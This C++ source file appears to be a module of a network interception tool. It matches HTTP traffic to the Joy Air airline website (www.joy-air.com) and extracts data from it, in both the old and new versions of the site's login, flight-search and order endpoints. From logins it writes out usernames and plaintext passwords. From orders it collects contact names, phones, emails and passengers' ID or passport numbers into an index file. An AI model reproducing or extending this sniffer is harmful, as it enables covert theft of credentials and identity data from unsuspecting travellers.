
#include "StdAfx.h"

#include "PlaneXingFuAirlines.h"

plane::XingFuAirlines::XingFuAirlines(HttpSession *http_session, const string &pro_name) : Airplane(http_session,pro_name)
{
	
}

plane::XingFuAirlines::~XingFuAirlines()
{
	
}

// ID_CARD 身份证，PASSPORT 护照，OTHER 其他证件
string plane::XingFuAirlines::GetIdType(string idType)
{
	string idTypeTrue;
	if (idType == "ID_CARD"){idTypeTrue = "身份证";}
	if (idType == "PASSPORT"){idTypeTrue = "护照";}
	if (idType == "OTHER"){idTypeTrue = "其他证件";}
	return idTypeTrue;
}

// NI 身份证，PP 护照，JG 军官 ID 其他
string plane::XingFuAirlines::GetIdTypeNew(string idType)
{
	string idTypeTrue;
	if (idType == "NI"){idTypeTrue = "身份证";}
	if (idType == "PP"){idTypeTrue = "护照";}
	if (idType == "JG"){idTypeTrue = "军官";}
	if (idType == "ID"){idTypeTrue = "其他";}
	return idTypeTrue;
}


int plane::XingFuAirlines::IsXingFuAirlines(HttpSession *http_session)
{
	//登录
	if((http_session->m_Requestline.m_Host.Find("www.joy-air.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/pssweb/memberauth/login")!=-1) )
	{
		return kpclogin;
	}
	//行程预订
	if((http_session->m_Requestline.m_Host.Find("www.joy-air.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/pssweb/ota/flights")!=-1))
	{
		return kpcticket;
	}	
	//提交订单
	if((http_session->m_Requestline.m_Host.Find("www.joy-air.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/pssweb/orders")!=-1))
	{
		return kpcorder;
	}
	//登录新版
	if((http_session->m_Requestline.m_Host.Find("www.joy-air.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/api/userNoAuth!loginByUser.action")!=-1) )
	{
		return kpcloginnew;
	}
	//行程预订新版
	if((http_session->m_Requestline.m_Host.Find("www.joy-air.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/api/flight!getFlights.action")!=-1))
	{
		return kpcticketnew;
	}
	//提交订单新版
	if((http_session->m_Requestline.m_Host.Find("www.joy-air.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/api/flightOrder!createOrder.action")!=-1))
	{
		return kpcordernew;
	}
	return 0;
}

int plane::XingFuAirlines::Process(const char *packet,int action)
{
	//登录
	if (action == kpclogin)
	{
		return pclogin(packet);
	}
	//行程预订
	if (action == kpcticket)
	{
		return pcticket(packet);
	}
	//提交订单
	if (action == kpcorder)
	{
		return pcorder(packet);
	}
	//登录新版
	if (action == kpcloginnew)
	{
		return pcloginnew(packet);
	}
	//行程预定新版
	if (action == kpcticketnew)
	{
		return pcticketnew(packet);
	}
	//提交订单新版
	if (action == kpcordernew)
	{
		return pcordernew(packet);
	}
	return 1;
}

//登录
int plane::XingFuAirlines::pclogin(const char *packet)
{
	string src_data(packet);
	src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	//提取json
	Json::Value value;
	Json::Reader reader;
	if (reader.parse(src_data,value))
	{
		username = value["username"].asString();
		password = value["password"].asString();
	}
	if (username.empty() || password.empty())
	{
		return 0;
	}
	output_text_ = 
		"user=" + username +"\r\n" + //账号
		"pass=" + password + "\r\n" + //密码
		"state=登录\r\n";
	WriteIndexFile();
	return 1;
}

// 行程预订
int plane::XingFuAirlines::pcticket(const char *packet)
{
	string src_data = http_session_->m_Requestline.m_URL.GetBuffer(0);
	src_data = ms_->UrlDecode(src_data);
	ms_->Replace(src_data,"?","&");
	ms_->SplitStringToMap(src_data,'&','=');
	//单程
	adtCount = ms_->GetValueFromMapByKey("adultNum",true);
	chdCount = ms_->GetValueFromMapByKey("childNum",true);
	deptCdTxt = ms_->GetValueFromMapByKey("orgcity",true);
	arrCdTxt = ms_->GetValueFromMapByKey("dstcity",true);
	deptDt = ms_->GetValueFromMapByKey("depDate",true);
	if (deptCdTxt.empty() || arrCdTxt.empty() || deptDt.empty())
	{
		return 0;
	}
	output_text_ =
		"netmark=" + adtCount + "\r\n" +	//成年人数
		"onick=" +	chdCount + "\r\n" +		//儿童人数
		"nick=" +	deptCdTxt + "\r\n" +	//出发地
		"msg=" + 	arrCdTxt + "\r\n" +		//目的地 
		"servername=" + deptDt + "\r\n" +	//出发日期
		"state=单程查询\r\n";
	WriteIndexFile();
	return 1;
}

//提交订单
int plane::XingFuAirlines::pcorder(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	//联系人信息
	Json::Reader reader;
	Json::Value value;
	string ContactName,ContactEmail,ContactMobilePhone;
	Json::Value airTicketParamInfoList;
	if (reader.parse(src_data,value))
	{
		Json::Value arrayObj =value["contactWayParamInfo"];
		ContactName = arrayObj["contactName"].asString();
		ContactEmail = arrayObj["contactEmail"].asString();
		ContactMobilePhone =arrayObj["contactMobilePhone"].asString();
		airTicketParamInfoList = value["airTicketParamInfoList"];
	}
	for (int i=0;i<airTicketParamInfoList.size();i++)
	{
		//姓名
		string name = airTicketParamInfoList[i]["paxFirstName"].asString();
		//身份证号
		string carno = airTicketParamInfoList[i]["cardNo"].asString();
		//证件类型
		string cardtype = airTicketParamInfoList[i]["cardType"].asString(); 
		cardtype = this->GetIdType(cardtype);
		//手机号
		string mobilephone = airTicketParamInfoList[i]["mobilePhone"].asString();

		if (ContactName.empty() || ContactEmail.empty() || ContactMobilePhone.empty() || name.empty() || carno.empty() || mobilephone.empty())
		{
			return 0;
		}
		output_text_ =
			"mid=" + 	ContactName + "\r\n" +			//联系人姓名
			"oid=" + 	ContactMobilePhone + "\r\n" +	//联系人电话
			"imsi=" + 	ContactEmail + "\r\n" +			//联系人邮箱
			"msgtype=" + name + "\r\n" +				//乘客姓名
			"clientmsg=" + 	mobilephone + "\r\n" +		//乘客电话
			"webname=" + 	cardtype + "\r\n" +			//乘客证件类型
			"subject=" + 	carno + "\r\n" +			//乘客证件号
			"state=提交订单\r\n";
		WriteIndexFile();
	}
	return 1;
}

//新版登录
int plane::XingFuAirlines::pcloginnew(const char *packet)
{
	string src_data(packet);
	src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	//提取json
	Json::Value value;
	Json::Reader reader;
	if (reader.parse(src_data,value))
	{
		username = value["loginid"].asString();
		password = value["pwd"].asString();
	}
	if (username.empty() || password.empty())
	{
		return 0;
	}
	output_text_ = 
		"user=" + username +"\r\n" + //账号
		"pass=" + password + "\r\n" + //密码
		"state=登录\r\n";
	WriteIndexFile();
	return 1;
}
//行程预定 新版
int plane::XingFuAirlines::pcticketnew(const char *packet)
{
	string src_data(packet);
	string tookit = "{\"orgCity";
	if (src_data.rfind(tookit) != -1)
	{
		src_data = src_data.substr(src_data.rfind(tookit));
	}
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	Json::Value value;
	Json::Reader read;
	if (read.parse(src_data,value))
	{
		triptype_ = value["tripType"].asString();
		//出发地
		deptCdTxt = value["orgCity"].asString();
		//目的地
		arrCdTxt = value["dstCity"].asString();
		//出发日期
		deptDt = value["flightdate"].asString();
		if (deptCdTxt.empty() || arrCdTxt.empty() || deptDt.empty())
		{
			return 0;
		}
		if (triptype_ == "ONEWAY")
		{
			output_text_ =
				"nick=" +	deptCdTxt + "\r\n" +	//出发地
				"msg=" + 	arrCdTxt + "\r\n" +		//目的地 
				"servername=" + deptDt + "\r\n" +	//出发日期
				"state=单程查询\r\n";
			WriteIndexFile();
		}
        if (triptype_ == "ROUNDTRIP")
        {
			output_text_ =
				"nick=" +	deptCdTxt + "\r\n" +	//出发地
				"msg=" + 	arrCdTxt + "\r\n" +		//目的地 
				"servername=" + deptDt + "\r\n" +	//出发日期
				"state=往返查询\r\n";
			WriteIndexFile();
        }
	}
	return 1;
}

//提交订单新版
int plane::XingFuAirlines::pcordernew(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	//联系人信息
	Json::Reader reader;
	Json::Value value;
	string ContactName,ContactEmail,ContactMobilePhone;
	Json::Value airTicketParamInfoList;
	if (reader.parse(src_data,value))
	{
		ContactName = value["contactName"].asString();
		ContactEmail = value["contactEmail"].asString();
		ContactMobilePhone =value["contactMobile"].asString();
		airTicketParamInfoList = value["passengers"];
	}
	for (int i=0;i<airTicketParamInfoList.size();i++)
	{
		//姓名
		string name = airTicketParamInfoList[i]["name"].asString();
		//证件号
		string carno = airTicketParamInfoList[i]["certificateNumber"].asString();
		//证件类型
		string cardtype = airTicketParamInfoList[i]["certificateType"].asString(); 
		cardtype = this->GetIdTypeNew(cardtype);
		//手机号
		string mobilephone = airTicketParamInfoList[i]["phone"].asString();
		
		if (ContactName.empty() || ContactMobilePhone.empty() || name.empty() || carno.empty() || mobilephone.empty())
		{
			return 0;
		}
		output_text_ =
			"mid=" + 	ContactName + "\r\n" +			//联系人姓名
			"oid=" + 	ContactMobilePhone + "\r\n" +	//联系人电话
			"imsi=" + 	ContactEmail + "\r\n" +			//联系人邮箱
			"msgtype=" + name + "\r\n" +				//乘客姓名
			"clientmsg=" + 	mobilephone + "\r\n" +		//乘客电话
			"webname=" + 	cardtype + "\r\n" +			//乘客证件类型
			"subject=" + 	carno + "\r\n" +			//乘客证件号
			"state=提交订单\r\n";
		WriteIndexFile();
	}
	return 1;
}